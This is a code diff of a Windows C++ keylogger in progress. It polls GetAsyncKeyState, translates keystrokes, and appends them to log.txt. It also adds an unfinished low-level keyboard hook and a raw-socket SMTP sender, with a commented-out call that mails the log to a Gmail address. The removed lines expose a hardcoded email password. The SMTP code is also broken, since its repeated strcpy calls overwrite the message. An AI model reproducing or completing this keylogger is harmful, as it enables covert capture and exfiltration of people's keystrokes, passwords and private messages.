@@ -1,208 +1,211 @@
+#define _CRT_SECURE_NO_WARNINGS
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
+
 #include <iostream>
+#include <fstream>
+#include <thread>
+#include <string>
+#include <WinSock2.h>
 #include <Windows.h>
 #include <stdio.h>
 #include <assert.h>
-#include <curl/curl.h>
 
-#define from_addr		"not4keylogging@gmail.com"
-#define from_pass		"pistol77!" 
-#define to_addr			"not4keylogging@gmail.com"	
-#define cc_addr			""
+/*
 
-static const char* email[] = {
-  "Date: Mon, 29 Nov 2010 21:54:29 +1100\r\n",
-  "To: " to_addr "\r\n",
-  "From: " from_addr "\r\n",
-  "Cc: " cc_addr "\r\n",
-  "Message-ID: <dcd7cb36-11db-487a-9f3a-e652a9458efd@"
-  "rfcpedant.example.org>\r\n",
-  "Subject: SMTP example message\r\n",
-  "\r\n", /* empty line to divide headers from body, see RFC5322 */
-  "The body of the message starts here.\r\n",
-  "\r\n",
-  "It could be a lot of lines, could be MIME encoded, whatever.\r\n",
-  "Check RFC5322.\r\n",
-  NULL
+DATA STRUCTURES
+
+*/
+
+//possible use of struct when keyboard hook implementation finished for simplification
+struct KEYMAP {
+	public:
+		char* keyMapUP;
+		char* keyMapLOW;
+		char* numMap;
+		char* symMap;
+
+		void set(char* UP, char* LOW, char* NUM, char* SYM) {
+			keyMapUP = UP;
+			keyMapLOW = LOW;
+			numMap = NUM;
+			symMap = SYM;
+		}
 };
 
-struct upload_status {
-	int lines_read;
-};
+/*
 
-static size_t payload_source(void* ptr, size_t size, size_t nmemb, void* userp) {
-	struct upload_status* upload_ctx = (struct upload_status*)userp;
-	const char* data;
+FUNCTIONS
 
-	if ((size == 0) || (nmemb == 0) || ((size * nmemb) < 1)) {
-		return 0;
+*/
+
+int send_email(const char* server, const char* to, const char* from, const char* subject, const char* msg) {
+	//work in progress
+	SOCKET socketfd;
+	WSADATA wsaData;
+	hostent* host;
+	sockaddr_in dest;
+
+	int sent;
+	char line[200];
+	if (WSAStartup(0x202, &wsaData) != SOCKET_ERROR) {
+		if ((host = gethostbyname(server)) != NULL) {
+			printf("now constructing email\n");
+			//set memory
+			memset(&dest, 0, sizeof(dest));
+			memcpy(&(dest.sin_addr), host->h_addr, host->h_length);
+			//prepare destination
+			dest.sin_family = host->h_addrtype;
+			dest.sin_port = htons(25);
+			//get socket
+			socketfd = socket(AF_INET, SOCK_STREAM, 0);
+			//connect
+			connect(socketfd, (struct sockaddr*) & dest, sizeof(dest));
+			//send command lines
+			strcpy(line, "hello me.someplace.com\n");
+			sent = send(socketfd, line, strlen(line), 0);
+			Sleep(500);
+
+			strcpy(line, "MAIL FROM:<");
+			strncat(line, from, strlen(from));
+			strncat(line, ">\n", 3);
+			sent = send(socketfd, line, strlen(line), 0);
+			Sleep(500);
+
+			strcpy(line, "RCPT TO:<");
+			strncat(line, to, strlen(to));
+			strncat(line, ">\n", 3);
+			sent = send(socketfd, line, strlen(line), 0);
+			Sleep(500);
+
+			strcpy(line, "DATA\n");
+			sent = send(socketfd, line, strlen(line), 0);
+			Sleep(500);
+
+			strcpy(line, "To: ");
+			strcpy(line, to);
+			strcpy(line, "\n");
+			strcpy(line, "From: ");
+			strcpy(line, from);
+			strcpy(line, "\n");
+			strcpy(line, "Subject: ");
+			strcpy(line, subject);
+			strcpy(line, "\n");
+			strcpy(line, msg);
+			strcpy(line, "\r\n.\r\n");
+			sent = send(socketfd, line, strlen(line), 0);
+			Sleep(500);
+
+			strcpy(line, "quit\n");
+			sent = send(socketfd, line, strlen(line), 0);
+			Sleep(500);
+		}
 	}
-
-	data = email[upload_ctx->lines_read];
-
-	if (data) {
-		size_t len = strlen(data);
-		memcpy(ptr, data, len);
-		upload_ctx->lines_read++;
-
-		return len;
-	}
-
+	//close socket and wsadata
+	closesocket(socketfd);
+	WSACleanup();
 	return 0;
 }
 
-int send_email()
-	{
-		CURL* curl;
-		CURLcode res = CURLE_OK;
-		struct curl_slist* recipients = NULL;
-		struct upload_status upload_ctx;
-
-		upload_ctx.lines_read = 0;
-
-		curl = curl_easy_init();
-		if (curl) {
-			/* Set username and password */
-			curl_easy_setopt(curl, CURLOPT_USERNAME, from_addr);
-			curl_easy_setopt(curl, CURLOPT_PASSWORD, from_pass);
-
-			/* This is the URL for your mailserver. Note the use of port 587 here,
-			 * instead of the normal SMTP port (25). Port 587 is commonly used for
-			 * secure mail submission (see RFC4403), but you should use whatever
-			 * matches your server configuration. */
-			curl_easy_setopt(curl, CURLOPT_URL, "smtp://mainserver.example.net:587");
-
-			/* In this example, we'll start with a plain text connection, and upgrade
-			 * to Transport Layer Security (TLS) using the STARTTLS command. Be careful
-			 * of using CURLUSESSL_TRY here, because if TLS upgrade fails, the transfer
-			 * will continue anyway - see the security discussion in the libcurl
-			 * tutorial for more details. */
-			curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)CURLUSESSL_ALL);
-
-			/* If your server doesn't have a valid certificate, then you can disable
-			 * part of the Transport Layer Security protection by setting the
-			 * CURLOPT_SSL_VERIFYPEER and CURLOPT_SSL_VERIFYHOST options to 0 (false).
-			 *   curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
-			 *   curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
-			 * That is, in general, a bad idea. It is still better than sending your
-			 * authentication details in plain text though.  Instead, you should get
-			 * the issuer certificate (or the host certificate if the certificate is
-			 * self-signed) and add it to the set of certificates that are known to
-			 * libcurl using CURLOPT_CAINFO and/or CURLOPT_CAPATH. See docs/SSLCERTS
-			 * for more information. */
-			curl_easy_setopt(curl, CURLOPT_CAINFO, "/path/to/certificate.pem");
-
-			/* Note that this option isn't strictly required, omitting it will result
-			 * in libcurl sending the MAIL FROM command with empty sender data. All
-			 * autoresponses should have an empty reverse-path, and should be directed
-			 * to the address in the reverse-path which triggered them. Otherwise,
-			 * they could cause an endless loop. See RFC 5321 Section 4.5.5 for more
-			 * details.
-			 */
-			curl_easy_setopt(curl, CURLOPT_MAIL_FROM, from_addr);
-
-			/* Add two recipients, in this particular case they correspond to the
-			 * To: and Cc: addressees in the header, but they could be any kind of
-			 * recipient. */
-			recipients = curl_slist_append(recipients, to_addr);
-			recipients = curl_slist_append(recipients, cc_addr);
-			curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);
-
-			/* We're using a callback function to specify the payload (the headers and
-			 * body of the message). You could just use the CURLOPT_READDATA option to
-			 * specify a FILE pointer to read from. */
-			curl_easy_setopt(curl, CURLOPT_READFUNCTION, payload_source);
-			curl_easy_setopt(curl, CURLOPT_READDATA, &upload_ctx);
-			curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
-
-			/* Since the traffic will be encrypted, it is very useful to turn on debug
-			 * information within libcurl to see what is happening during the transfer.
-			 */
-			curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
-
-			/* Send the message */
-			res = curl_easy_perform(curl);
-
-			/* Check for errors */
-			if (res != CURLE_OK)
-				fprintf(stderr, "curl_easy_perform() failed: %s\n",
-					curl_easy_strerror(res));
-
-			/* Free the list of recipients */
-			curl_slist_free_all(recipients);
-
-			/* Always cleanup */
-			curl_easy_cleanup(curl);
-		}
-
-		return (int)res;
-	}
-
-int log_key(int key, const char* file) {
-	std::cout << key << std::endl;
+std::string convert_vKey(int key, int is_cap) {
+	std::string sKey;
 	//character maps for virtual keys to chars
 	char keyMapUP[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
 	char keyMapLOW[] = "abcdefghijklmnopqrstuvwxyz";
 	char numMap[] = "0123456789*+";
 	char symMap[] = "-./";
-	FILE* theFile;
-	errno_t error = fopen_s(&theFile, file, "a+");
-	//fopen_s == 0 on success
-	if (error == 0) {
-		//key has not been pressed since last poll
-		if (key == VK_BACK) {
-			fprintf(theFile, " [BACK] ");
-		}
-		else if (key == VK_TAB) {
-			fprintf(theFile, " [TAB] ");
-		}
-		else if (key == VK_SHIFT) {
-			fprintf(theFile, " [SHIFT] ");
-		}
-		else if (key == VK_RETURN) {
-			fprintf(theFile, "[ENTER] ");
-		}
-		else if (key == VK_ESCAPE) {
-			fprintf(theFile, " [ESC] ");
-		}
-		else if (key == VK_SPACE) {
-			fprintf(theFile, " [SPACEBAR] ");
-		}
-		else if (key > 64 && key < 91) {
-			//key is A-Z or a-z
-			if (GetKeyState(VK_CAPITAL) & 0x1) {
-				//key is A-Z
-				fprintf(theFile, "%c", keyMapUP[key % 65]);
-			}
-			else {
-				//key is a-z
-				fprintf(theFile, "%c", keyMapLOW[key % 65]);
-			}
-		}
-		else if (key > 47 && key < 58) {
-			//key is 0-9
-			fprintf(theFile, "%c", numMap[key%48]);
-		}
-		else if (key > 95 && key < 108) {
-			//key is 0-9 or 
-			fprintf(theFile, "%c", numMap[key%96]);
-		}
-		else if (key > 108 && key < 112) {
-			//key is - . / 
-			fprintf(theFile, "%c", symMap[key % 109]);
+	if (key == VK_F8) {
+		sKey = "\n*** EXIT ***\n";
+	}
+	else if (key == VK_BACK) {
+		sKey = " [BACK] ";
+	}
+	else if (key == VK_TAB) {
+		sKey = " [TAB] ";
+	}
+	else if (key == VK_SHIFT) {
+		sKey = " [SHIFT] ";
+	}
+	else if (key == VK_RETURN) {
+		sKey = "[ENTER] ";
+	}
+	else if (key == VK_ESCAPE) {
+		sKey = " [ESC] ";
+	}
+	else if (key == VK_SPACE) {
+		sKey = " ";
+	}
+	else if (key > 64 && key < 91) {
+		//key is A-Z or a-z
+		if (is_cap) {
+			//key is A-Z
+			sKey = keyMapUP[key % 65];
 		}
 		else {
-			//key is other
-			fprintf(theFile, "%c", char(key));
+			//key is a-z
+			sKey = keyMapLOW[key % 65];
 		}
 	}
+	else if (key > 47 && key < 58) {
+		//key is 0-9
+		sKey = numMap[key % 48];
+	}
+	else if (key > 95 && key < 108) {
+		//key is 0-9 or 
+		sKey = numMap[key % 96];
+	}
+	else if (key > 108 && key < 112) {
+		//key is - . / 
+		sKey = symMap[key % 109];
+	}
 	else {
-		//error detected on fopen_s
+		//key is other
+		if (key != 160 && key != 161) {
+			sKey = std::to_string(key);
+		}
+	}
+	return sKey;
+}
+
+int log_key(int key, int is_cap) {
+	std::string sKey = convert_vKey(key, is_cap);
+	std::cout << sKey << std::endl;
+	std::ofstream theFile;
+	theFile.open("log.txt", std::ofstream::out | std::ofstream::app);
+	if (theFile.is_open()) {
+		theFile << sKey;
+		std::cout << sKey << std::endl;
+	}
+	else {
 		std::cout << "error opening file" << std::endl;
 	}
-	if (theFile) {
-		error = fclose(theFile);
-	}
+	theFile.close();
 	return 0;
+}
+
+LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+	//work in progress
+	//keyboard hook log implementation
+	//nCode: HC_ACTION > 0 on actual key returned, <=0 on nothing
+	//WPARAM: WM_KEYDOWN, WM_KEYUP, WM_SYSKEYDOWN, WM_SYSKEYUP
+	//LPARAM: pointer to struct holding virtual key
+	if (nCode == HC_ACTION) {
+		switch (wParam) {
+			case WM_KEYUP:
+				//keydown to keyup
+				KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
+				int key = p->vkCode;
+				break;
+			/*
+			case WM_SYSKEYDOWN:
+				//keyup to keydown + ALT or F10
+			case WM_SYSKEYUP:
+				//keydown to keyup + ALT or F10
+			case WM_KEYDOWN:
+				//keyup to keydown
+			*/
+		}
+	}
+	return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
 int zero_array(int* array, int size) {
@@ -212,17 +215,13 @@ int zero_array(int* array, int size) {
 	return 0;
 }
 
-int log_key(int key, char* file);
-int zero_array(int* array, int size);
-static size_t payload_source(void* ptr, size_t size, size_t nmemb, void* userp);
-int send_email();
-
-int main() {
+int GetAsyncLogger() {
+	//GetAsyncKeyState() key log implementation
 	int active = 1;
 	const int size = 256;
 	int activityMap[size];
-	zero_array(activityMap,size);
-	send_email();
+	zero_array(activityMap, size);
+	//send_email("gmail-smtp-in.l.google.com","not4keylogging@gmail.com","not4keylogging@gmail.com","- keylog -","log.txt");
 	while (active) {
 		//poll every 50ms
 		Sleep(50);
@@ -235,7 +234,12 @@ int main() {
 				}
 				if (activityMap[i] == 0) {
 					//unique key press
-					log_key(i, "log.txt");
+					int is_cap = 0;
+					if (GetKeyState(VK_CAPITAL) & 0x1) {
+						//capts on
+						is_cap = 1;
+					}
+					log_key(i, is_cap);
 				}
 				activityMap[i] = 1;
 			}
@@ -245,5 +249,19 @@ int main() {
 			}
 		}
 	}
+	return 0;
+}
+
+int log_key(int key, int is_cap);
+int zero_array(int* array, int size);
+int send_email(const char* server, const char* to, const char* from, const char* subject, const char* msg);
+LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
+std::string convert_vKey(int key, int is_cap);
+int GetAsyncLogger();
+
+int main() {
+	std::thread GAKSimplementation;
+	GAKSimplementation = std::thread(GetAsyncLogger);
+	GAKSimplementation.join();
 	return 0;
 }
